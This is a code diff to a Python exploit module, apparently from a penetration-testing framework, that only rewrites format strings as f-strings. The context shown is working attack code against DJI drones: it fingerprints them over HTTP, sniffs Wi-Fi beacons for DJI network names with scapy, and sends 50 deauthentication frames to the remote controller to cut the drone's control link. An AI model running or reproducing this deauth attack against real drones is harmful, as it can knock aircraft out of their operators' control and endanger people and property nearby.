@@ -106,8 +106,7 @@ class Exploit(HTTPClient):
     @mute
     def check(self) -> bool:
         try:
-            res = self.http_request("GET", "http://{}:{}/api/v1/version".format(
-                self.target, 80), timeout=5)
+            res = self.http_request("GET", f"http://{self.target}:{80}/api/v1/version", timeout=5)
             if res and any(fp in (res.text or "") for fp in ("DJI", "Mavic", "Spark")):
                 return True
         except Exception:
@@ -132,12 +131,12 @@ class Exploit(HTTPClient):
                         if any(ssid.startswith(p) for p in _DJI_SSID_PREFIXES):
                             found[bssid] = ssid
 
-                print_status("[Stage 1] Scanning 5 seconds on {}...".format(self.interface))
+                print_status(f"[Stage 1] Scanning 5 seconds on {self.interface}...")
                 sniff(iface=self.interface, prn=_handle_beacon, timeout=5, store=False)
                 if found:
                     print_success("[Stage 1] DJI APs found:")
                     for bssid, ssid in found.items():
-                        print_info("[Stage 1] BSSID={} SSID={}".format(bssid, ssid))
+                        print_info(f"[Stage 1] BSSID={bssid} SSID={ssid}")
                 else:
                     print_warning("[Stage 1] No DJI APs found in range")
             except ImportError:
@@ -162,13 +161,13 @@ class Exploit(HTTPClient):
                              addr3=self.drone_bssid)
                     / Dot11Deauth(reason=7)
                 )
-                print_status("[Stage 2] Sending 50 deauth frames to {}".format(self.rc_mac))
+                print_status(f"[Stage 2] Sending 50 deauth frames to {self.rc_mac}")
                 sendp(frame, count=50, inter=0.1, verbose=False)
                 print_success("[Stage 2] Deauth frames sent — monitor drone for RC link loss")
             except ImportError:
                 print_error("[Stage 2] scapy not available — install scapy for deauth")
             except Exception as e:
-                print_error("[Stage 2] Deauth error: {}".format(e))
+                print_error(f"[Stage 2] Deauth error: {e}")
         else:
             print_info("[Stage 2] Set do_deauth=True + drone_bssid + rc_mac for deauth test")
 
